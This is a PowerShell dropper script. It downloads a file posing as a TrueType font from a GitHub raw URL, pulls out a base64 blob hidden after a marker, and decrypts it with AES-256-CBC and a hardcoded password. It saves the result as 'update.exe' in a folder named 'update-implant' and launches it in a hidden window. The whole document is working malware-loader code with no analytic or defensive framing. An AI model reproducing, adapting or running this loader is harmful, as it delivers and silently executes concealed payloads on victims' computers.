# Requires PowerShell 5+
$ErrorActionPreference = 'Stop'

$MAGIC_MARKER  = '###MARKER###'
$DECRYPT_PASS  = 'JIeifjeu34##8JHE'
$SAVE_PATH     = Join-Path $env:LOCALAPPDATA 'update-implant\update.exe'

$DIR_PATH = Split-Path -Parent $SAVE_PATH
if (-not (Test-Path $DIR_PATH)) { New-Item -ItemType Directory -Path $DIR_PATH -Force | Out-Null }

$ENC_PATH   = "$SAVE_PATH.tmp"
$TARGET_URL = 'https://raw.githubusercontent.com/johnmorinn540-eng/orebishopping/refs/heads/main/public/main_rose.ttf'

Write-Host "[*] Trying download from: $TARGET_URL ..."

try {
    Invoke-WebRequest -Uri $TARGET_URL -OutFile $ENC_PATH -UseBasicParsing -TimeoutSec 120
} catch {
    Write-Host '[-] Download failed.'
    exit 1
}

if (-not (Test-Path $ENC_PATH) -or (Get-Item $ENC_PATH).Length -eq 0) {
    Write-Host '[-] Download failed.'
    exit 1
}

Write-Host '[*] Extracting payload...'

$bytes = [System.IO.File]::ReadAllBytes($ENC_PATH)
$marker = [System.Text.Encoding]::ASCII.GetBytes($MAGIC_MARKER)

$offset = -1
for ($i = 0; $i -le ($bytes.Length - $marker.Length); $i++) {
    if ($bytes[$i] -eq $marker[0]) {
        $hit = $true
        for ($j = 1; $j -lt $marker.Length; $j++) {
            if ($bytes[$i + $j] -ne $marker[$j]) { $hit = $false; break }
        }
        if ($hit) { $offset = $i; break }
    }
}

if ($offset -lt 0) {
    Write-Host '[-] Invalid file format.'
    Remove-Item $ENC_PATH -Force -ErrorAction SilentlyContinue
    exit 1
}

# payload starts after the marker and the newline that follows it
$start = $offset + $marker.Length + 1
$b64 = [System.Text.Encoding]::ASCII.GetString($bytes, $start, $bytes.Length - $start)
Remove-Item $ENC_PATH -Force -ErrorAction SilentlyContinue

# openssl salted blob: literal "Salted__", 8 byte salt, then ciphertext.
# AES-256-CBC with the EVP_BytesToKey chain openssl CLI uses.
$blob = [Convert]::FromBase64String($b64)

if ($blob.Length -lt 32 -or
    [System.Text.Encoding]::ASCII.GetString($blob, 0, 8) -ne 'Salted__') {
    Write-Host '[-] Invalid payload header.'
    exit 1
}

$salt = $blob[8..15]
$raw  = $blob[16..($blob.Length - 1)]
$pass = [System.Text.Encoding]::UTF8.GetBytes($DECRYPT_PASS)

# EVP_BytesToKey: D_i = MD5(D_i-1 + pass + salt), 32-byte key then 16-byte IV
$md5 = [System.Security.Cryptography.MD5]::Create()
$d1  = $md5.ComputeHash([byte[]]($pass + $salt))
$d2  = $md5.ComputeHash([byte[]]($d1 + $pass + $salt))
$d3  = $md5.ComputeHash([byte[]]($d2 + $pass + $salt))
$key = [byte[]]($d1 + $d2)
$iv  = $d3

try {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 256
    $aes.Key     = $key
    $aes.IV      = $iv
    $plain = $aes.CreateDecryptor().TransformFinalBlock($raw, 0, $raw.Length)
    $aes.Dispose()
} catch {
    Write-Host '[-] Decryption failed.'
    exit 1
}

[System.IO.File]::WriteAllBytes($SAVE_PATH, $plain)
Remove-Item "$SAVE_PATH.tmp" -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $SAVE_PATH) -or (Get-Item $SAVE_PATH).Length -eq 0) {
    Write-Host '[-] Decryption failed.'
    exit 1
}

Write-Host '[+] Executing...'
Start-Process -FilePath $SAVE_PATH -ArgumentList '--service' -WindowStyle Hidden
